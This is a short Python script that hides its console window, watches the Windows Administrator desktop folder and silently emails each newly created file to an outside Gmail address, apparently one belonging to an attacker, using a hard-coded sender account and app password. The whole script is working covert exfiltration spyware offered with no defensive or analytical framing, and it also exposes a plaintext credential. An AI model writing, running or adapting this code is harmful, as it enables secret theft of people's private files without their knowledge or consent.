import os
import time
import smtplib
import logging
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

log_path = os.path.join(os.path.dirname(__file__), "log.txt")
logging.basicConfig(filename=log_path, level=logging.INFO, format="%(asctime)s - %(message)s")

WATCHED_FOLDER = r"C:\\Users\\Administrator\\Desktop"
EMAIL_SENDER = "amazon.eticaret080@gmail.com"
EMAIL_PASSWORD = "wicm dkjn wezo gfvu"
EMAIL_RECEIVER = "aythacker97@gmail.com"

class Watcher(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            logging.info(f"Yeni dosya bulundu: {event.src_path}")
            self.send_email_with_attachment(event.src_path)

    def send_email_with_attachment(self, filepath):
        msg = EmailMessage()
        msg["Subject"] = "Yeni Dosya Geldi"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        try:
            with open(filepath, "rb") as f:
                file_data = f.read()
                file_name = os.path.basename(filepath)
            msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
            logging.info(f"{file_name} mail olarak gönderildi.")
        except Exception as e:
            logging.error(f"Mail gönderme hatası: {e}")

if __name__ == "__main__":
    hide_console()
    event_handler = Watcher()
    observer = Observer()
    observer.schedule(event_handler, WATCHED_FOLDER, recursive=False)
    observer.start()
    logging.info(f"Klasör izleniyor: {WATCHED_FOLDER}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
